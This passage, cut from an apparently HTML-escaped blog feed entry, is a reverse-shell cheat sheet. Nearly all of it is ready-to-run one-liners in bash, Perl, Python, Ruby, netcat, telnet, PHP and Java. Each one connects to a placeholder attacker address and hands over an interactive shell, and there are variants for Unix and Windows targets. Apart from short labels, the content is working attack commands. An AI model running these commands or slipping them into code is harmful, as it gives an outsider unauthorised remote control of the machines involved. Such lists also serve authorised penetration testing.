while read line 0&amp;lt;&amp;amp;5; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done

bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/4444 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;
&lt;!-- more --&gt;
&lt;p&gt;Perl&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-perl&quot;&gt;//Does not depend on /bin/sh
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;'

//Windows target
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;'

//Could try this one also. (*nix /bin/sh)
perl -e 'use Socket;$i=&quot;attackerip&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Python&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ruby&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;//Does not depend on /bin/sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'

//Windows Target
ruby -rsocket -e 'c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'

//*nix /bin/sh
ruby -rsocket -e'f=TCPSocket.open(&quot;attackerip&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&quot;,f,f,f)'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Netcat&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nc attackerip 4444 -e /bin/sh
/bin/sh | nc attackerip 4444
rm -f /tmp/p; mknod /tmp/p p &amp;amp;&amp;amp; nc attackerip 4444 0/tmp/p
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Telnet&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;rm -f /tmp/p; mknod /tmp/p p &amp;amp;&amp;amp; telnet attackerip 4444 0/tmp/p
Or:
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
# Setup listener on attcker machine on port 4445/tcp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;PHP&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'
# This code assumes that the TCP connection uses file descriptor 3. 
# If it doesn’t work, try 4, 5, 6…
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Java Reverse Shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&amp;lt;&amp;gt;/dev/tcp/ATTACKING-IP/80;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&quot;] as String[])
p.waitFor()
&lt;/code&gt;&lt;/pre&gt;
</content>

 </entry>
 

</feed>
